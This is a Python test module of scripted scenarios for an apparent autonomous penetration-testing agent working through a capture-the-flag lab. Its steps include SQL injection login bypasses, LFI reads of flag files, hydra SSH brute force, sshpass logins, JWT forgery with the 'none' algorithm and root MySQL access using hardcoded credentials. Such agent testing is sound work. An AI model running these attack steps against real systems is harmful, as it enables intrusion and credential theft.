"""
Ozz — Edge Case Scenarios
Testa situações onde o agente pode travar ou falhar.
"""

EDGE_CASE_SCENARIOS = {
    "loop_detection": [
        {"thought": "Vou escanear o target", "action": "quick_scan", "action_input": "10.0.0.10"},
        {"thought": "Preciso de mais info, vou escanear de novo", "action": "nmap", "action_input": "-sV 10.0.0.10"},
        {"thought": "Vou escanear de novo pra ter certeza", "action": "nmap", "action_input": "-sC -sV 10.0.0.10"},
        {"thought": "Estou em loop — devo mudar de abordagem", "action": "curl", "action_input": "-s http://10.0.0.10/"},
        {"thought": "Encontrei login. Vou testar SQLi", "action": "curl", "action_input": "-s -X POST 'http://10.0.0.10/?page=login' -d \"username=admin'--&password=test\""},
        {"thought": "SQLi funcionou! Vou pegar a flag via LFI", "action": "curl", "action_input": "-s 'http://10.0.0.10/?page=reports&file=/var/secret/flag.txt'"},
        {"thought": "FLAG!", "action": "submit_flag", "action_input": "flag{web_master_2026}"},
    ],

    "wrong_tool_first": [
        {"thought": "Vou tentar SQLi sem escanear primeiro", "action": "curl", "action_input": "-s -X POST 'http://10.0.0.10/login' -d \"username=admin'--&password=test\""},
        {"thought": "Não funcionou — URL errada. Vou escanear primeiro", "action": "quick_scan", "action_input": "10.0.0.10"},
        {"thought": "Agora sei que o login é em /?page=login", "action": "curl", "action_input": "-s -X POST 'http://10.0.0.10/?page=login' -d \"username=admin'--&password=test\""},
        {"thought": "SQLi funcionou! Vou buscar a flag", "action": "curl", "action_input": "-s 'http://10.0.0.10/?page=reports&file=/var/secret/flag.txt'"},
        {"thought": "FLAG!", "action": "submit_flag", "action_input": "flag{web_master_2026}"},
    ],

    "multi_target_parallel": [
        {"thought": "Vou escanear todos os targets de uma vez", "action": "shell", "action_input": "nmap -sn 10.0.0.0/24"},
        {"thought": "4 hosts ativos. Vou escanear os 3 primeiros em paralelo", "action": "quick_scan", "action_input": "10.0.0.10"},
        {"thought": "TARGET-01 mapeado. Indo pro 02", "action": "quick_scan", "action_input": "10.0.0.20"},
        {"thought": "TARGET-02 mapeado. Indo pro 03", "action": "quick_scan", "action_input": "10.0.0.30"},
        {"thought": "Tenho info dos 3. Priorizando TARGET-01 (web mais vulnerável)", "action": "curl", "action_input": "-s -X POST 'http://10.0.0.10/?page=login' -d \"username=admin'--&password=test\""},
        {"thought": "SQLi OK! Buscando flag", "action": "curl", "action_input": "-s 'http://10.0.0.10/?page=reports&file=/var/secret/flag.txt'"},
        {"thought": "FLAG 1!", "action": "submit_flag", "action_input": "flag{web_master_2026}"},
        {"thought": "Indo pro SSH do TARGET-02 com credenciais do 01", "action": "shell", "action_input": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@10.0.0.20 'cat /home/admin/flag.txt; cat /opt/config.ini'"},
        {"thought": "FLAG 2 + credenciais MySQL!", "action": "submit_flag", "action_input": "flag{ssh_ghost_2026}"},
        {"thought": "Indo pro API do TARGET-03", "action": "curl", "action_input": "-s -X POST http://10.0.0.30:5000/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin2026\"}'"},
        {"thought": "Login OK. JWT bypass pra pegar flag", "action": "shell", "action_input": "python3 -c \"import jwt; t=jwt.encode({'user':'admin','role':'admin'},'',algorithm='none'); print(t)\""},
        {"thought": "JWT forged. Buscando flag", "action": "curl", "action_input": "-s http://10.0.0.30:5000/admin/secrets -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.'"},
        {"thought": "FLAG 3!", "action": "submit_flag", "action_input": "flag{api_breaker_2026}"},
        {"thought": "Pivotando pro MySQL interno com todas as credenciais", "action": "shell", "action_input": "mysql -h 10.0.0.40 -u root -p'MySQL_R00t_2026!' -e 'USE corporate; SELECT * FROM internal_secrets;'"},
        {"thought": "FLAGS 4 e 5!", "action": "submit_flag", "action_input": "flag{deep_vault_2026}"},
        {"thought": "MEGA FLAG!", "action": "submit_flag", "action_input": "flag{halctf_king_2026}"},
    ],

    "failure_recovery": [
        {"thought": "Vou escanear TARGET-01", "action": "quick_scan", "action_input": "10.0.0.10"},
        {"thought": "Testando SQLi", "action": "curl", "action_input": "-s -X POST 'http://10.0.0.10/login' -d \"username=admin'--&password=test\""},
        {"thought": "Falhou — URL errada. Tentando outro endpoint", "action": "curl", "action_input": "-s 'http://10.0.0.10/'"},
        {"thought": "Vi que tem ?page=login", "action": "curl", "action_input": "-s -X POST 'http://10.0.0.10/?page=login' -d \"username=admin'--&password=test\""},
        {"thought": "SQLi OK! Vou usar gobuster pra encontrar mais endpoints", "action": "gobuster", "action_input": "dir -u http://10.0.0.10 -w /usr/share/wordlists/dirb/common.txt -t 5"},
        {"thought": "Encontrei /debug e /api. Vou testar LFI no reports", "action": "curl", "action_input": "-s 'http://10.0.0.10/?page=reports&file=/var/secret/flag.txt'"},
        {"thought": "FLAG!", "action": "submit_flag", "action_input": "flag{web_master_2026}"},
    ],

    "exploitdb_search": [
        {"thought": "Vou escanear TARGET-02 pra ver serviços", "action": "quick_scan", "action_input": "10.0.0.20"},
        {"thought": "Samba 4.5 — vou buscar exploits conhecidos", "action": "searchsploit", "action_input": "samba 4.5"},
        {"thought": "Encontrei CVE-2017-7494 (SambaCry). Mas primeiro vou tentar credenciais fracas", "action": "shell", "action_input": "hydra -l admin -P /usr/share/wordlists/dirb/common.txt ssh://10.0.0.20 -t 4 -f"},
        {"thought": "Credencial encontrada: admin:password123", "action": "shell", "action_input": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@10.0.0.20 'cat /home/admin/flag.txt'"},
        {"thought": "FLAG!", "action": "submit_flag", "action_input": "flag{ssh_ghost_2026}"},
    ],
}


def get_edge_case_names() -> list[str]:
    return list(EDGE_CASE_SCENARIOS.keys())


def get_edge_case(name: str) -> list[dict]:
    return EDGE_CASE_SCENARIOS.get(name, [])
